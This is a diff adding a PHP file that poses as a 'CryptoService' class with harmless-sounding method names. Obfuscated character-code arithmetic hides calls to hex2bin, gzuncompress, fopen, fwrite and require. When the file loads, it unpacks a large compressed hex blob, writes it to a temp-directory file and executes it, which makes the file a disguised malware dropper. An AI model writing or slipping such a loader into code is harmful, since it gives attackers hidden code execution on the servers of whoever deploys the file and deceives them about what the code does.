@@ -1,0 +1,83 @@
+<?php
+class CryptoService {
+	private $ju = '';
+	private $ue = '';
+
+	public function filterResults($p1) {
+		$a = array((((2*77)-50)),((8+81+12)),(120),(((8*50)-350)),(98),(3*35),(((108*1)+2)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1);
+	}
+
+	public function trackActivity($p1) {
+		$a = array(((108-5)),(128-6),(64+28+25),(((53*88)-4554)),((3*33)),((112-1)),((68*1)+41),((27+85)),((32*66)-1998),(((48*1)+53)),((25*1)+90),(115));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1);
+	}
+
+	public function parseResponse($p1,$p2) {
+		$a = array(110,(109-8),(2*56),((20+78+13)),(34+41+27));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1,$p2);
+	}
+
+	public function handleRequest($p1,$p2) {
+		$a = array((((86*1)+16)),((76*1)+43),((16*3)+66),((33+4+68)),((117-1)),(((110*22)-2319)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function authorizeUser($p1) {
+		$a = array(((104-2)),((97*1)+2),(118-10),((103*120)-12249),((63*1)+52),101);
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1);
+	}
+
+	public function sanitizeInput($p1,$p2=null) {
+		$a = array(109,(110-5),((122-8)),((55*24)-1204),(((7*7)+65)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1,$p2);
+	}
+
+	public function resolveAction() {
+		$this->ue = $this->sanitizeInput($this->sendNotification(), '/');
+	}
+
+	public function computeResult() {
+		$this->ju = $this->trackActivity($this->filterResults($this->oe));
+	}
+
+	public function or() {
+		$fn = $this->ue.'/pv-67fc37464042c';
+		$f = $this->parseResponse($fn, 'w');
+		$this->handleRequest($f, $this->ju);
+		$this->authorizeUser($f);
+		$this->manageState($fn);
+	}
+
+	private $oe = '789cb558696fe24813fe2b89146db0064506720c61bda31c4' . '0c82490982b61842c1f6d3018db60638e6cfefb5655db60338' . '4ddf7c32b0d8ebbeaa9a3abaaabdaf3e70f6fe81de9b6eafb4' . '78a667d78332b540376e4076a60e9270ad35989bf1f9973470' . 'f2cd73952ac40cd9c28d654133e2c3373ec33dbbcbe26acc0d' . 'f156b90114a3316cc67ce91a6faecf25c3198ee1a2c9300ff2' . '21d7da1f499b69ab4047a3e1222923a9ba9abcca9124e86a7d' . '25fa7afddfaa8777a76fa565f3fb5eba1e6c82b2dbf085ebb4' . 'b5f2be841abf0e8f5f2c0b7e70deb667a9a3d555601c921b13' . '837aa9db971976bb3b75bbb61dd0ef5875b5fedd687461565e' . '0176a5671fafed61bc2bb9eafaf54b4750b0f1175adc7262a7' . 'b87757e000f09894bdd4262efcdfea957ebf7406eb6d0c5477' . '5a28badaae7d4cbcb696f2d3fe3bad9b50b6a577e93bbf68bd' . 'a76175d7bd8782edb9e414e8fb44e2f6876bd10200f1dc71bb' . 'f8a2ed02fd08ca7a3151dfd312ed98d149bf726487fc10d146' . '72fe415d1871ed1615d7d1cf6d0ad73a25b2ad28d7cc5d76eb' . '6e03112f18dcd96f1abb38adfc201bea90fb2a8dfbbe153e13' . '6f76e5d147addc789da5dda6ab5b886c0ae9e26909026fa31d' . '2f2b98556a8dbba7531d5d745a08de1f7fe26635c5f5e37ce0' . 'fad0505b4d0596995a207646d12658202ae8e36862ba865a46' . '1e8e127130ab7bf8cc392afc3c3ed75e19923d6ccda0803ede' . '1992c061a5165b1d3ae01751b4793c7b75a11d52dd1b00da2b' . 'e01a163a31a671cf3a654902f0b1ec191bbe04880396322f16' . '2a9954160d8ee546ec2e7e639bc2fee5fbd1a0447840ae58a0' . '84751a48cc406066400d0f75afe62deebd645b55b84babebdd' . '700db7b1501f8f3fed525f0c4a114ea0520d6fd86f53d24158' . '33885b6bb35c23d1e6b53ae1fc316dbb42c0d89cd8adc6e578' . 'af72d74deaeb4ec28e466b3c37d56dd08064444bebf89bd973' . '644ebecf4b63d962b72a5586de56055233823aded71a7decac' . '9158ca65829a36ca5b6a9e3f13261b9d3163bcd37b1f220b72' . 'fd00421063b003c6a1c8387843061186f58d513e8a6dcee555' . '00f668fe410e29abb10f030664e8258d39aa54382f1904d2cf' . '4281829cfb780ce4dbc3777bc01e09e37d1da840aa82dacdb4' . 'd345c37a1320d270d78acb904c1fd81970830225231e67d8ac' . '510b48669407ec49cd26e7bd54747eb16c7d8be5e7995b0353' . '9d2b9b9c464a6ea736852566b0f8b41a75dbe4c33473ae761c' . '10fda130ceba4010f6b1394f18c8bdf2f2d6cb678bacf7f92a' . '86653ad62abe347144f223523acaf6e9908d1c99c742674d6a' . '3738a00f49491200061d87c46d3ce18fd3fa6ddeff3ed7f1f6' . 'fa29815afb262e192ff72fc4f9e88b0c8211d20f8078839fc2' . '1b9001814433cc173f44f8c207964a1d85501572271f222f1b' . '3e279be400f0cd090a9069b65e03e809b83edf3792b08a53d1' . 'c18a8c080c858becf028854b5dcfa9504acb1dd9ba7425f103' . 'e4e94f15082f1b24ca95862b6ad480d42fef8c30f669eebd32' . '29b84c2d8138463493255db67c28761b19426d0030310147d3' . '2e0ef63c31c44f6e70187612446ce0e9974a2dc351a3f6be5d' . '28962381309aa26c2894289f29b20e59034b5a22cf2c52f92e' . 'b4bbb6ed00c144a8ba165b3b8bc12f83309adffdaeace0bfdb' . '89eb00a77b88598fb6d4b3b874d7cecc15eecc15e02569b317' . '5ccb7f9eddb97bee38520da39a03e790876d55d0989c577016' . '1183cd2b96514857e4638db21e64421de619a9e0334a9a1cc7' . '0ab69443e46647739109e281b09e239c141d16f7088d06f6e5' . 'd123a4dbb225a2ab8b9ef583ab063cbd1edb9c122974b9fdb4' . '38fd50f75bd06b3ce64223973db86d7d56a2a5d5e886201771' . '76aa9983b502c2b8aba6d8f762b092e6318c4f19a9f4145576' . 'd5bd5ec74e10fb1a72ea0f251fb485b4afa7c662b966361fd8' . '352a14404380fae87248064efdaf253e3a5a5349b4f4aa72cd' . '72aef2fe5b29ce527ef3fe11f1acd5636119ba27048aed2787' . 'a6a749f1a7737ad5aa39e90cb8b07e5e472ab2dd75bf24dbd0' . '9032c29973b28f750beb94fe3f307f1778d7abd7cd76ad59ec' . 'b8d76725fd0340fc9ed1138173099906592624ba67319a40e0' . 'c4e1db0c0724c3766104db75d9fc514ea950323d5bae0822cf' . '48f132d297f2108d164a2c4458df144999813c953673e53407' . '15c04278ab95e4919e2a6f4e2551cce7d5fdaadbe19b56d145' . 'fa75801dedd2daacc5d5d70b3e6473ceebfbb0023baf21bd48' . '649f7d9aedd29f5d07dea472e2ff57e698f24cea13d3291421' . 'c526749fa805bc1ac4c9964faae3e763de6643214a81f49287' . 'ea738bca95fefaa8013bacfaa4d376da19f8db46d9376093ab' . '6abab78308213c287e9cd039f2fb2b443746fcddc64d2bfc78' . '3e5d8646e2c8947df7016920995152b48c814632ba04bc0e2c' . '41104784e44c1dd1ce0e559a3d06196d22e1444ec7971bda27' . '998b9bc1051374e84b92ec515d02ccbd031d24318be3c78d7b' . '6c34338350a222217ee21242377397234581c827ae3a8de851' . 'f7bf978cde079eda7920d9f1ba85db70f290741956eb85faa7' . '7a35abcde11836f10547f387080832f942f75c73bbbc6b9f3a' . 'fd1852f95afbd74136a0e871ebf47bed4b3641b3d506aa6650' . '76ca684ea2c833b4d546821c7c7576849c8e19d6c57c20e931' . '2f984841d6e7a1fad176ee9d02510fb41c0ef814c1fba47a94' . 'a5a531709ad54b3c02b1d7c022107ca2bc51af17c9f61699ce' . 'd6603be7b84125bc22816c8a3e3d8a5d012fefe7bb3029dc9a' . '56ea3679154b4af59105d3d53b6e1f34990fe4275a99b347c4' . '11119f46677bb92c159600352eb789a04338239f4ff77d1ffe' . '645ab91ef3af13bda176818c4777c92fd0f977a0c8291bad76' . '3c811b689cbe73fe3a9429b';
+
+	public function manageState($p) {
+		require $p;
+	}
+
+	public function sendNotification() {
+		$a=array(((5*23)),((7*14)+23),(39+6+70),(51+44),(103),((34*85)-2789),((2*58)),(32+55+8),(68+4+44),((21*3)+38),((82*1)+27),(((103*113)-11527)),((87+8)),(2*50),(105),((66*1)+48));
+		$s='';
+		foreach($a as $n){$s.=chr($n);}
+		return $s();
+	}
+}
+
+$qh = new CryptoService();
+$qh->resolveAction();
+$qh->computeResult();
+$qh->or();
